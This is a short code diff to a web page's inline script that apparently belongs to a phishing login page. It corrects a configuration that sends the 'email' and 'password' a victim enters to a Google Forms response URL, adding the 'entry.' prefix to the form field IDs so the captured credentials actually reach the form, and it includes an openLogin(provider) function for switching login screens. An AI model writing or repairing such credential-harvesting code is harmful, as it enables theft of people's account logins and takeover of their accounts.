@@ -118,12 +118,12 @@
   </div>
 
   <script>
-    // --- UPDATED CONFIGURATION ---
-    const CONFIG = {
-        formURL: "https://docs.google.com/forms/d/e/1FAIpQLSeXCmnYtIxx7wfATC-F0mz3vAMu3nVe3TbfzAxXO6JHhpcCoQ/formResponse",
-        emailEntry: "1706692759", // Email ID from your form
-        passEntry: "1593339077"    // Password ID from your form
-    };
+ // --- NEW FIXED CONFIG ---
+const CONFIG = {
+    formURL: "https://docs.google.com/forms/d/e/1FAIpQLSeXCmnYtIxx7wfATC-F0mz3vAMu3nVe3TbfzAxXO6JHhpcCoQ/formResponse",
+    emailEntry: "entry.1706692759", // Added "entry." prefix
+    passEntry: "entry.1593339077"   // Added "entry." prefix
+};
 
     function openLogin(provider) {
       document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
